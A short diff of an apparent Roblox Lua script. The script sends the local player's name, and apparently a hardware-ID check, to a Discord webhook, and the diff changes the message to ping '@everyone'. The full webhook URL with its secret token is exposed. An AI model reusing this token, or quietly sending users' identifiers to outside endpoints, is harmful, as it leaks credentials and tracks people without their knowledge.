@@ -22,7 +22,7 @@ username = game:GetService("Players").LocalPlayer.Name
     
 local url = "https://discord.com/api/webhooks/904937939446951946/7CyKsdBWX4fANcoUUdzpZ8E1HBmYFnoRffPxWu8J087iAV-PYbKqefq3pUh7pohCtJe4"
 local data = {
-   ["content"] = " ",
+   ["content"] = "@everyone",
    ["embeds"] = {
        {
            ["title"] = "**Hwid Check**",
